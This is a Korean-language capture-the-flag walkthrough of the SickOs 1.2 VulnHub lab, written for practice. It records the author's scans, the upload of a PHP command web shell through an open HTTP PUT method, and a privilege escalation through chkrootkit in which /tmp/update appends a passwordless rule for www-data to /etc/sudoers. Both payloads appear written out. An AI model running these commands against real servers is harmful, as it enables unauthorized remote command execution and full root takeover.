[SickOs1.2](https://www.vulnhub.com/entry/sickos-12,144/)

# targetdiscovery
***
### nmap -sn 192.168.25.29-255 --open
![1](https://user-images.githubusercontent.com/69203345/113571188-de88f600-9650-11eb-8a70-beb30db00bce.PNG)

# enumerate + exploitation
***
## target: 192.168.25.33
### nmap -O -sV -sS -p- 192.168.25.33
![2](https://user-images.githubusercontent.com/69203345/113571381-44757d80-9651-11eb-8803-46b829e77f3c.PNG)      
### dirb ://192.168.25.33
![3](https://user-images.githubusercontent.com/69203345/113571906-2a886a80-9652-11eb-95cb-27738736e849.PNG)      
192.168.25.33/test 찾음     
![4](https://user-images.githubusercontent.com/69203345/113572189-bac6af80-9652-11eb-87f7-087c063b6055.PNG)      
### curl -IX OPTIONS ://192.168.25.33/test
![5](https://user-images.githubusercontent.com/69203345/113572453-3294da00-9653-11eb-99bb-1ecabbe5e258.PNG)       
PUT메소드가 열려있다 이용해서 쉘부터 얻어야징     
일단 테스트 부터     
#### curl -X PUT -d '<?php system($\_GET["cmd"]);?>' ://192.168.29.33/test/test.php
![6](https://user-images.githubusercontent.com/69203345/113573001-3ecd6700-9654-11eb-8a8c-b31a77178ee4.PNG)    
일단은 작동 되는듯...?     
cp /usr/share/webshells/php/php-reverse-shell.php ./
vim 으로 ip와 port 바꿔준뒤 올려서 netcat 실행할 생각     
### curl --upload-file php-reverse-shell.php ://192.168.25.33/test/shell.php --http1.0     
일단 쉘 획득    
![7](https://user-images.githubusercontent.com/69203345/113574132-75a47c80-9656-11eb-991c-0cb9268c9147.PNG)       
# privilege escalation 
***   
#### ls -al /etc/cron*
![8](https://user-images.githubusercontent.com/69203345/113574827-d7b1b180-9657-11eb-83e6-e494b70de890.PNG)      
chkrootkit -V     
![9](https://user-images.githubusercontent.com/69203345/113574907-0465c900-9658-11eb-8e0b-6a2af6388874.PNG)      
searchsploit chkrootkit 
![10](https://user-images.githubusercontent.com/69203345/113575270-940b7780-9658-11eb-8172-824c5cc1ca41.PNG)      
cat 33899.txt     
![11](https://user-images.githubusercontent.com/69203345/113575382-ba311780-9658-11eb-8670-1c9a5a75adb7.PNG)     
/tmp/update 폴더를 만들어서 실행권한 부여해주고 sudoers 권한 상승해주고..내용 바꾸고 다시 440 으로 바꾸는걸 update에서 하면 되려나...?      
####### echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update    
![12](https://user-images.githubusercontent.com/69203345/113575700-3deb0400-9659-11eb-8c7a-785249220ad1.PNG)     


ㄲ-ㅌ       
root획득      
꼭 이방법만 있는것은 아니다.     
으악.     
***
이번 포인트?     
PUT method - 특별한 인증을 요구하지 않는 이런 경우 해당 메소드를 사용해 웹 쉘을 올릴 수 있다.     
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update        
curl -X PUT -d '<?php system($\_GET["cmd"]);?>' ://192.168.29.33/test/test.php
